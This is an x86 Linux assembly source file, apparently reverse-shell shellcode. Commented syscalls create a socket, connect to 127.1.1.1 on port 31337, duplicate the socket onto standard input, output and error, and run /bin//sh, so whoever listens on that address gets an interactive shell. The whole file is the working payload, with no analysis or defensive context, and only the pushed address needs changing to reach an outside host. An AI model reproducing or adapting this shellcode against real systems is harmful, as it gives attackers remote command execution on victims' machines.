.text
  .global _start

_start:
#fd = socket(PF_INET, SOCK_STREAM, IPPROTO_IP); //socket(2, 1, 0)
push $0x66
pop %eax
push $0x1
pop %ebx
cltd
push %edx
push %ebx
push $0x2
mov %esp,%ecx
int $0x80

mov %eax,%esi

#connect(fd, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("127.1.1.1")}, 16);
mov $0x66,%al
mov $0x3,%bl
push $0x0101017f
pushw $0x697a
pushw $0x2
mov %esp,%ecx
push $0x10
push %ecx
push %esi
mov %esp,%ecx
int $0x80

#dup2(fd, 2); dup2(fd, 1); dup2(fd, 0);
xor %ecx,%ecx
mov $0x2,%cl
mov %esi,%ebx
duploop:
mov $0x3f,%al
int $0x80
dec %ecx
jns duploop

#execve("/bin//sh", 0, 0);
push %edx
push $0x68732F2F
push $0x6E69622F
mov $0xb, %al
mov %esp, %ebx
xor %ecx, %ecx
int $0x80


